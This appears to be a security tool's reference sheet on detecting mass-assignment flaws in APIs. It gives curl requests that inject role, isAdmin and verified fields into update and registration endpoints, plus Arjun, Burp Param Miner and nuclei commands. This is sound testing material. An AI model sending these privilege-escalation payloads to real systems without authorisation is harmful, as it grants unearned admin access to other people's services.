<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
# API Reference — Detecting Mass Assignment

## curl — Field Injection
```bash
# Test privilege fields on update endpoint
curl -s -X PUT URL/api/users/me -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"user","role":"admin","isAdmin":true}'

# Registration mass assignment
curl -s -X POST URL/api/register -H "Content-Type: application/json" \
  -d '{"username":"test","password":"pass","role":"admin","verified":true}'
```

## Arjun — Parameter Discovery
```bash
arjun -u URL/api/users/me -m PUT --headers "Authorization: Bearer TOKEN" --json
arjun -u URL/api/users/me -m PUT -w api-params.txt
```

## Burp Suite — Param Miner
```
1. Send PUT/PATCH request to Intruder
2. Use Param Miner extension for hidden parameter discovery
3. Add privilege field wordlist as payload
4. Compare response bodies for field acceptance
```

## nuclei — Mass Assignment Templates
```bash
nuclei -u URL -t http/vulnerabilities/ -tags mass-assignment
```
